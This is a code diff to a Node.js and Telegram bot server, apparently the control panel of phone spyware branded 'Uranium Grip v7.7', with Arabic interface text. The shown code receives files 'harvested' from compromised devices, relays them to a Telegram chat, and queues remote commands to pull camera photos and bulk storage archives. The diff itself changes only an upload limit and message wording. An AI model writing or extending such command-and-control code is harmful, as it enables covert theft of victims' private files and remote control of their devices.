@@ -32,7 +32,7 @@ appBot.on('polling_error', (error) => {
     }
 });
 
-app.use(express.text({ type: 'application/json', limit: '1024mb' }));
+app.use(express.text({ type: 'application/json', limit: '2048mb' }));
 app.use(express.raw({ type: 'application/octet-stream', limit: '5000mb' }));
 
 async function sendTg(msg, options = {}) {
@@ -67,7 +67,7 @@ app.post('/api/v3/uranium/upload_raw', async (req, res) => {
         const fileSizeMB = stats.size / (1024 * 1024);
 
         if (fileSizeMB > 45) {
-            await sendTg(`⚠️ <b>الحصاد العملاق المستلم (${fileSizeMB.toFixed(2)} MB):</b> <code>${safeName}</code> تم تأمينه في خزنة اليورانيوم المركزية.`);
+            await sendTg(`⚠️ <b>الحصاد الضخم المستلم (${fileSizeMB.toFixed(2)} MB):</b> <code>${safeName}</code> تم تأمينه في خزنة اليورانيوم المركزية بنجاح.`);
         } else {
             await appBot.sendDocument(chatId, finalPath, { 
                 caption: `☢️ <b>قبضة اليورانيوم v7.7 - حصاد ملكي جديد:</b>\n📱 العقدة: <code>${nodeId}</code> (${nodeModel})\n📂 <code>${safeName}</code> (${fileSizeMB.toFixed(2)} MB)` 
@@ -148,7 +148,7 @@ appBot.on('callback_query', async (query) => {
         const keyboard = {
             inline_keyboard: [
                 [
-                    { text: '☢️️ الحصاد الشامل الكاميرا DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
+                    { text: '☢️ الحصاد الشامل الكاميرا DCIM', callback_data: `cmd_EXTRACT_CAMERA_ZIP_${nodeId}` },
                     { text: '📥 التخزين الضخم Download (10GB+)', callback_data: `cmd_EXTRACT_STORAGE_ZIP_${nodeId}` }
                 ],
                 [
@@ -191,7 +191,7 @@ appBot.on('callback_query', async (query) => {
 
         db.run(`INSERT INTO tasks (node_id, action, payload, status) VALUES (?, ?, '{}', 'PENDING')`, [targetNodeId, action], async () => {
             await appBot.answerCallbackQuery(query.id, { text: `☢️ تم إطلاق الأمر [${action}] بنجاح!` });
-            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ للعقدة <code>${targetNodeId}</code>...</b>`);
+            await sendTg(`⚡ <b>أمر سيطرة [<code>${action}</code>] قيد التنفيذ الفوري للعقدة <code>${targetNodeId}</code>...</b>`);
         });
     } else if (data === 'back_home') {
         await appBot.deleteMessage(msg.chat.id, msg.message_id);
